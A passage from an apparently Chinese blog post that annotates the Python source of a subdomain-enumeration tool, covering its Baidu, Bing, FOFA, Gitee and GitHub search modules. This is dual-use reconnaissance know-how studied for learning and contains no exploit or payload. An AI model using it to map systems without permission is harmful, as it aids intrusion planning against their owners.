生成常见子域名列表，即把前面的common_subnames形成的子域名生成</span><br>    subdomains_temp = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> x: x + <span class="hljs-string">&#x27;.&#x27;</span> + domain, settings.common_subnames))<br>    <span class="hljs-comment"># 返回同时在subdomain和subdomains_tmp中的子域名</span><br>    subdomains_temp = <span class="hljs-built_in">list</span>(subdomain.intersection(subdomains_temp))<br>    <span class="hljs-comment"># 即生成如下内容(-site:m.qq.com-site:bbs.qq.com)并加入statements_list列表</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(subdomains_temp), <span class="hljs-number">2</span>):  <span class="hljs-comment"># 同时排除2个子域</span><br>        statements_list.append(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">set</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> s: <span class="hljs-string">&#x27; -site:&#x27;</span> + s,<br>                                               subdomains_temp[i:i + <span class="hljs-number">2</span>]))))<br>    <span class="hljs-keyword">return</span> statements_list<br></code></pre></div></td></tr></table></figure><h3 id="6-1-2-recursive-subdomain"><a href="#6-1-2-recursive-subdomain" class="headerlink" title="6.1.2 recursive_subdomain"></a>6.1.2 recursive_subdomain</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recursive_subdomain</span>(<span class="hljs-params">self</span>):</span><br>    <span class="hljs-comment"># 递归搜索下一层的子域</span><br>    <span class="hljs-comment"># 从1开始是之前已经做过1层子域搜索了,当前实际递归层数是layer+1</span><br>    <span class="hljs-comment"># self.recursive_times是需要递归搜索的层数，默认为2</span><br>    <span class="hljs-keyword">for</span> layer_num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, self.recursive_times):<br>        <span class="hljs-keyword">for</span> subdomain <span class="hljs-keyword">in</span> self.subdomains:<br>            <span class="hljs-comment"># 进行下一层子域搜索的限制条件</span><br>            count = subdomain.count(<span class="hljs-string">&#x27;.&#x27;</span>) - self.domain.count(<span class="hljs-string">&#x27;.&#x27;</span>)<br>            <span class="hljs-keyword">if</span> count == layer_num:<br>                <span class="hljs-comment"># yield就是 return 返回一个值，并且记住这个返回的位置，下次迭代就从这个位置后开始</span><br>                <span class="hljs-keyword">yield</span> subdomain<br>                <span class="hljs-comment"># 使用示例</span><br>                <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">                def yield_test(n):  </span><br><span class="hljs-string">                    for i in range(n):  </span><br><span class="hljs-string">                        yield i  </span><br><span class="hljs-string">                        print(&quot;i=&quot;,i)  </span><br><span class="hljs-string">                    #做一些其它的事情      </span><br><span class="hljs-string">                    print(&quot;do something.&quot;)      </span><br><span class="hljs-string">                    print(&quot;end.&quot;)  </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">                #使用for循环  </span><br><span class="hljs-string">                for i in yield_test(5):  </span><br><span class="hljs-string">                    print(i,&quot;,&quot;)</span><br><span class="hljs-string">                &quot;&quot;&quot;</span><br></code></pre></div></td></tr></table></figure><h2 id="6-2-baidu"><a href="#6-2-baidu" class="headerlink" title="6.2 baidu"></a>6.2 baidu</h2><p>相较于前一个的查询此处主要是多了跳转url地址</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Baidu</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;BaiduSearch&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://www.baidu.com/s&#x27;</span><br>        self.domain = domain<br>        self.limit_num = <span class="hljs-number">750</span>  <span class="hljs-comment"># 限制搜索条数</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">redirect_match</span>(<span class="hljs-params">self, html</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        获取跳转地址并传递地址进行跳转head请求</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param html: 响应体</span><br><span class="hljs-string">        :return: 子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        bs = BeautifulSoup(html, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>        subdomains_all = <span class="hljs-built_in">set</span>()<br>        <span class="hljs-comment"># 获取搜索结果中所有的跳转URL地址</span><br>        <span class="hljs-keyword">for</span> find_res <span class="hljs-keyword">in</span> bs.find_all(<span class="hljs-string">&#x27;a&#x27;</span>, &#123;<span class="hljs-string">&#x27;class&#x27;</span>: <span class="hljs-string">&#x27;c-showurl&#x27;</span>&#125;):<br>            url = find_res.get(<span class="hljs-string">&#x27;href&#x27;</span>)<br>            <span class="hljs-comment"># 跟进函数 </span><br>            subdomains = self.match_location(url)<br>            subdomains_all.update(subdomains)<br>        <span class="hljs-keyword">return</span> subdomains_all<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self, domain, filtered_subdomain=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param str domain: 域名</span><br><span class="hljs-string">        :param str filtered_subdomain: 过滤的子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.page_num = <span class="hljs-number">0</span>  <span class="hljs-comment"># 二次搜索重新置0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            time.sleep(self.delay)<br>            self.header = self.get_header()<br>            self.proxy = self.get_proxy(self.source)<br>            query = <span class="hljs-string">&#x27;site:.&#x27;</span> + domain + filtered_subdomain<br>            params = &#123;<span class="hljs-string">&#x27;wd&#x27;</span>: query,<br>                      <span class="hljs-string">&#x27;pn&#x27;</span>: self.page_num,<br>                      <span class="hljs-string">&#x27;rn&#x27;</span>: self.per_page_num&#125;<br>            resp = self.get(self.addr, params)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(domain) &gt; <span class="hljs-number">12</span>:  <span class="hljs-comment"># 解决百度搜索结果中域名过长会显示不全的问题</span><br>                <span class="hljs-comment"># 获取百度跳转URL响应头的Location字段获取直链</span><br>                <span class="hljs-comment"># 返回匹配成功的子域名</span><br>                subdomains = self.redirect_match(resp.text)<br>            <span class="hljs-keyword">else</span>:<br>                subdomains = self.match_subdomains(resp, fuzzy=<span class="hljs-literal">False</span>)<br>            <span class="hljs-comment"># 检查该域名是否重复</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.check_subdomains(subdomains):<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            self.page_num += self.per_page_num<br>            <span class="hljs-comment"># 搜索页面没有出现下一页时停止搜索</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">f&#x27;&amp;pn=<span class="hljs-subst">&#123;self.page_num&#125;</span>&amp;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> self.page_num &gt;= self.limit_num:  <span class="hljs-comment"># 搜索条数限制</span><br>                <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><h3 id="6-2-1-match-location"><a href="#6-2-1-match-location" class="headerlink" title="6.2.1 match_location"></a>6.2.1 match_location</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">match_location</span>(<span class="hljs-params">self, url</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    匹配跳转之后的url</span><br><span class="hljs-string">    针对部分搜索引擎(如百度搜索)搜索展示url时有显示不全的情况</span><br><span class="hljs-string">    此函数会向每条结果的链接发送head请求获取响应头的location值并做子域匹配</span><br><span class="hljs-string"></span><br><span class="hljs-string">    :param str url: 展示结果的url链接</span><br><span class="hljs-string">    :return: 匹配的子域</span><br><span class="hljs-string">    :rtype set</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 获得请求url后的response</span><br>    resp = self.head(url, check=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>()<br>    <span class="hljs-comment"># 获得跳转的地址</span><br>    location = resp.headers.get(<span class="hljs-string">&#x27;location&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> location:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>()<br>    <span class="hljs-comment"># 返回经过匹配的子域名内容</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(self.match_subdomains(location))<br></code></pre></div></td></tr></table></figure><h2 id="6-3-bing"><a href="#6-3-bing" class="headerlink" title="6.3 bing"></a>6.3 bing</h2><p>完全类似ask中的内容</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Bing</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;BingSearch&#x27;</span><br>        self.init = <span class="hljs-string">&#x27;https://www.bing.com/&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://www.bing.com/search&#x27;</span><br>        self.limit_num = <span class="hljs-number">1000</span>  <span class="hljs-comment"># 限制搜索条数</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self, domain, filtered_subdomain=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param str domain: 域名</span><br><span class="hljs-string">        :param str filtered_subdomain: 过滤的子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        self.page_num = <span class="hljs-number">0</span>  <span class="hljs-comment"># 二次搜索重新置0</span><br>        resp = self.get(self.init)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            <span class="hljs-keyword">return</span><br>        self.cookie = resp.cookies  <span class="hljs-comment"># 获取cookie bing在搜索时需要带上cookie</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            time.sleep(self.delay)<br>            self.proxy = self.get_proxy(self.source)<br>            query = <span class="hljs-string">&#x27;site:.&#x27;</span> + domain + filtered_subdomain<br>            params = &#123;<span class="hljs-string">&#x27;q&#x27;</span>: query, <span class="hljs-string">&#x27;first&#x27;</span>: self.page_num,<br>                      <span class="hljs-string">&#x27;count&#x27;</span>: self.per_page_num&#125;<br>            resp = self.get(self.addr, params)<br>            subdomains = self.match_subdomains(resp, fuzzy=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.check_subdomains(subdomains):<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            <span class="hljs-comment"># 搜索页面没有出现下一页时停止搜索</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;div class=&quot;sw_next&quot;&gt;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">break</span><br>            self.page_num += self.per_page_num<br>            <span class="hljs-keyword">if</span> self.page_num &gt;= self.limit_num:  <span class="hljs-comment"># 搜索条数限制</span><br>                <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><h2 id="6-4-bing-api"><a href="#6-4-bing-api" class="headerlink" title="6.4 bing_api"></a>6.4 bing_api</h2><p>之后的内容如果有较为新的部分就继续分析，否则直接通过</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BingAPI</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;BingAPISearch&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://api.cognitive.microsoft.com/bing/v7.0/search&#x27;</span><br>        self.<span class="hljs-built_in">id</span> = settings.bing_api_id<br>        self.key = settings.bing_api_key<br>        self.limit_num = <span class="hljs-number">1000</span>  <span class="hljs-comment"># 必应同一个搜索关键词限制搜索条数</span><br>        self.delay = <span class="hljs-number">1</span>  <span class="hljs-comment"># 必应自定义搜索限制时延1秒</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self, domain, filtered_subdomain=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param str domain: 域名</span><br><span class="hljs-string">        :param str filtered_subdomain: 过滤的子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.page_num = <span class="hljs-number">0</span>  <span class="hljs-comment"># 二次搜索重新置0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            time.sleep(self.delay)<br>            self.header = self.get_header()<br>            self.header = &#123;<span class="hljs-string">&#x27;Ocp-Apim-Subscription-Key&#x27;</span>: self.key&#125;<br>            self.proxy = self.get_proxy(self.source)<br>            query = <span class="hljs-string">&#x27;site:.&#x27;</span> + domain + filtered_subdomain<br>            params = &#123;<span class="hljs-string">&#x27;q&#x27;</span>: query, <span class="hljs-string">&#x27;safesearch&#x27;</span>: <span class="hljs-string">&#x27;Off&#x27;</span>,<br>                      <span class="hljs-string">&#x27;count&#x27;</span>: self.per_page_num,<br>                      <span class="hljs-string">&#x27;offset&#x27;</span>: self.page_num&#125;<br>            resp = self.get(self.addr, params)<br>            subdomains = self.match_subdomains(resp)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.check_subdomains(subdomains):<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            self.page_num += self.per_page_num<br>            <span class="hljs-keyword">if</span> self.page_num &gt;= self.limit_num:  <span class="hljs-comment"># 搜索条数限制</span><br>                <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><h2 id="6-5-fofa-api"><a href="#6-5-fofa-api" class="headerlink" title="6.5 fofa_api"></a>6.5 fofa_api</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FoFa</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;FoFaAPISearch&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://fofa.so/api/v1/search/all&#x27;</span><br>        self.delay = <span class="hljs-number">1</span><br>        self.email = settings.fofa_api_email<br>        self.key = settings.fofa_api_key<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.page_num = <span class="hljs-number">1</span><br>        subdomain_encode = <span class="hljs-string">f&#x27;domain=&quot;<span class="hljs-subst">&#123;self.domain&#125;</span>&quot;&#x27;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        query_data = base64.b64encode(subdomain_encode)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            time.sleep(self.delay)<br>            self.header = self.get_header()<br>            self.proxy = self.get_proxy(self.source)<br>            query = &#123;<span class="hljs-string">&#x27;email&#x27;</span>: self.email,<br>                     <span class="hljs-string">&#x27;key&#x27;</span>: self.key,<br>                     <span class="hljs-string">&#x27;qbase64&#x27;</span>: query_data,<br>                     <span class="hljs-string">&#x27;page&#x27;</span>: self.page_num,<br>                     <span class="hljs-string">&#x27;full&#x27;</span>: <span class="hljs-string">&#x27;true&#x27;</span>,<br>                     <span class="hljs-string">&#x27;size&#x27;</span>: <span class="hljs-number">1000</span>&#125;<br>            resp = self.get(self.addr, query)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>                <span class="hljs-keyword">return</span><br>            resp_json = resp.json()<br>            subdomains = self.match_subdomains(resp)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subdomains:  <span class="hljs-comment"># 搜索没有发现子域名则停止搜索</span><br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            size = resp_json.get(<span class="hljs-string">&#x27;size&#x27;</span>)<br>            <span class="hljs-keyword">if</span> size &lt; <span class="hljs-number">1000</span>:<br>                <span class="hljs-keyword">break</span><br>            self.page_num += <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><h2 id="6-6-gitee"><a href="#6-6-gitee" class="headerlink" title="6.6 gitee"></a>6.6 gitee</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Gitee</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.source = <span class="hljs-string">&#x27;GiteeSearch&#x27;</span><br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://search.gitee.com/&#x27;</span><br>        self.domain = domain<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        page_num = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            time.sleep(self.delay)<br>            self.header = self.get_header()<br>            self.proxy = self.get_proxy(self.source)<br>            params = &#123;<span class="hljs-string">&#x27;pageno&#x27;</span>: page_num, <span class="hljs-string">&#x27;q&#x27;</span>: self.domain, <span class="hljs-string">&#x27;type&#x27;</span>: <span class="hljs-string">&#x27;code&#x27;</span>&#125;<br>            <span class="hljs-keyword">try</span>:<br>                resp = self.get(self.addr, params=params)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">200</span>:<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module query failed&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;class=&quot;empty-box&quot;&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">break</span><br>            soup = BeautifulSoup(resp.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>            subdomains = self.match_subdomains(soup, fuzzy=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.check_subdomains(subdomains):<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;li class=&quot;disabled&quot;&gt;&lt;a href=&quot;###&quot;&gt;&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">break</span><br>            page_num += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> page_num &gt;= <span class="hljs-number">100</span>:<br>                <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><h2 id="6-7-github-api"><a href="#6-7-github-api" class="headerlink" title="6.7 github_api"></a>6.7 github_api</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td 